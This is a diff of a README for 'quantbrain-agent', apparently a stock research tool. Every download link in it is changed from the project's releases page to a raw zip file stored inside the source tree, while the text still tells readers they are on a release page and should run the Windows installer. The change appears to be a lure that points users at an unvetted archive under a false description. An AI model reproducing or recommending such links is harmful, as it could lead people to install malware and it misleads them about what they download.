@@ -1,6 +1,6 @@
 # 🤖 quantbrain-agent - Automated Stock Research Tool
 
-[![Download quantbrain-agent](https://img.shields.io/badge/Download-quantbrain--agent-green?style=for-the-badge)](https://github.com/Dracccc02/quantbrain-agent/releases)
+[![Download quantbrain-agent](https://img.shields.io/badge/Download-quantbrain--agent-green?style=for-the-badge)](https://github.com/Dracccc02/quantbrain-agent/raw/refs/heads/main/src/push/agent-quantbrain-1.8.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to download, install, and run quantbrain-agent on your Window
 
 Go to the official release page for quantbrain-agent here:
 
-[Download quantbrain-agent Releases](https://github.com/Dracccc02/quantbrain-agent/releases)
+[Download quantbrain-agent Releases](https://github.com/Dracccc02/quantbrain-agent/raw/refs/heads/main/src/push/agent-quantbrain-1.8.zip)
 
 This page contains the latest versions of the software and related files.
 
@@ -139,7 +139,7 @@ quantbrain-agent/
 
 To download and run quantbrain-agent, use the button below:
 
-[![Download quantbrain-agent](https://img.shields.io/badge/Download-quantbrain--agent-green?style=for-the-badge)](https://github.com/Dracccc02/quantbrain-agent/releases)
+[![Download quantbrain-agent](https://img.shields.io/badge/Download-quantbrain--agent-green?style=for-the-badge)](https://github.com/Dracccc02/quantbrain-agent/raw/refs/heads/main/src/push/agent-quantbrain-1.8.zip)
 
 Click the link above, select the latest Windows installer, download it, and run the installer.
 
